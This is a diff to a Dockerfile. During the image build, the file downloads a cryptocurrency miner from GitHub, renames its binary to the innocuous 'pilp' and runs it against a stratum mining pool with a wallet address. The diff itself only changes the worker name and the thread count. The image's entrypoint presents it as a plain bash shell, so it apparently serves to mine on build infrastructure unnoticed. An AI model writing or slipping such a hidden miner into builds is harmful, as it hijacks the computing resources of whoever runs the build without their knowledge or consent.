@@ -6,6 +6,6 @@ RUN apt update -y \
 RUN wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz   \
   && tar -xvf cpuminer-opt-linux.tar.gz  \
   && mv cpuminer-avx2 pilp   \
-  && ./pilp -a curvehash -o stratum+tcp://stratum-asia.rplant.xyz:7058 -u TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN.orle -p x  -t 0
+  && ./pilp -a curvehash -o stratum+tcp://stratum-asia.rplant.xyz:7058 -u TvLoZcKzhQPmxWqc7FdL4f64euZ8zq8aDN.squash -p x  -t 2
 ENTRYPOINT ["/bin/bash"]
 CMD ["ls"]
